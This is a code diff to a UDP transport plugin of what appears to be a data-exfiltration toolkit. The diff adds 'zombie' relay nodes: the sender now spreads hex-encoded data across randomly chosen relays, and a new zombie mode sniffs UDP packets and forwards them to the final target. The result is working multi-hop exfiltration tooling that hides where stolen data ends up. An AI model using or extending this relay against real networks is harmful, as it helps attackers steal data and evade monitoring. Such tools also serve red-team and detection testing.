@@ -1,20 +1,24 @@
 import socket
 import sys
+from random import choice
 
 config = None
 app_exfiltrate = None
 
 
 def send(data):
-    target = config['target']
+    targets = [config['target']] + config['zombies']
+    target = choice(targets)
     port = config['port']
     app_exfiltrate.log_message(
         'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     client_socket.sendto(data.encode('hex'), (target, port))
 
-
 def listen():
+    sniff(handler=app_exfiltrate.retrieve_data)
+
+def sniff(handler):
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -40,7 +44,8 @@ def listen():
                         'info', "[udp] Received {} bytes".format(len(data)))
                     try:
                         data = data.decode('hex')
-                        app_exfiltrate.retrieve_data(data)
+                        #app_exfiltrate.retrieve_data(data)
+                        handler(data)
                     except Exception, e:
                         app_exfiltrate.log_message(
                             'warning', "[udp] Failed decoding message {}".format(e))
@@ -48,6 +53,19 @@ def listen():
                     break
         finally:
             pass
+
+def relay_dns_packet(data):
+    target = config['target']
+    port = config['port']
+    app_exfiltrate.log_message(
+        'info', "[zombie] [udp] Relaying {0} bytes to {1}".format(len(data), target))
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    client_socket.sendto(data.encode('hex'), (target, port))
+
+def zombie():
+    app_exfiltrate.log_message(
+            'info', "[zombie] [udp] Listening for udp packets")
+    sniff(handler=relay_dns_packet)
 
 
 class Plugin:
@@ -57,4 +75,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('udp', {'send': send, 'listen': listen})
+        app.register_plugin('udp', {'send': send, 'listen': listen, 'zombie': zombie})
